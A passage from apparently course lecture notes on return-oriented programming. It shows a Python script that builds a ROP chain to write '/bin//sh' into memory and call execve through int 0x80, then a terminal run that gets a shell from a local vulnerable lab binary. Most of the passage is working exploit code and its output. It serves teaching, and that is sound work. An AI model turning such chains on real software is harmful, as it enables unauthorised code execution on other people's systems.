p += pack('<I', 0x080bb746) #pop eax; ret
p += "/bin" # bin
p += pack('<I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
p += pack('<I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below

#Write an //sh 0x080ea064
p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea064) #address to write to
p += pack('<I', 0x080bb746) #pop eax; ret
p += "//sh" # bin
p += pack('<I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
p += pack('<I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below


#Set eax to 0xb and ebx to 0x080ea060
p += pack('<I', 0x080584a6) # : xor eax, eax ; pop ebx ; ret
p += pack('<I', 0x080ea060) #address of "/bin/sh"
p += pack('<I', 0x0807b466) # inc eax (1)
p += pack('<I', 0x0807b466) # inc eax (2)
p += pack('<I', 0x0807b466) # inc eax (3)
p += pack('<I', 0x0807b466) # inc eax (4)
p += pack('<I', 0x0807b466) # inc eax (5)
p += pack('<I', 0x0807b466) # inc eax (6)
p += pack('<I', 0x0807b466) # inc eax (7)
p += pack('<I', 0x0807b466) # inc eax (8) 
p += pack('<I', 0x0807b466) # inc eax (9)
p += pack('<I', 0x0807b466) # inc eax (a)
p += pack('<I', 0x0807b466) # inc eax (b)

#Set ecx to 0
p += pack('<I', 0x080e4c5d) # : pop ecx ; ret
p += pack('<I', 0xffffffff) # value for ecx
p += pack('<I', 0x080daa6c) # : inc ecx ; ret (ecx now zero)


#Set edx to 0

p += pack('<I', 0x0806e97a)# pop edx ; ret
p += pack('<I', 0xffffffff)# set edx to 0xfffffff
p += pack('<I', 0x0805d0e7)# : inc edx ; ret

#call interupt
p += pack('<I', 0x0806f040) # int 0x80; ret

print p
```

``` example
user@si485H-base:demo$ ./vulnerable `python shell_rop.py`
Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
                                                                                                                        /binﾭ?zdF?
z?????@?                                                                                                                         //shﾭަ`fffffffffff]????l?
$ echo "Go Navy, Beat Army!"
Go Navy, Beat Army!
$ 
```

THE END!

[1] Much of the ROP examples are adapted from
[CodeArcanna](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
article by Alex Reese, Tue 28 May 2013.

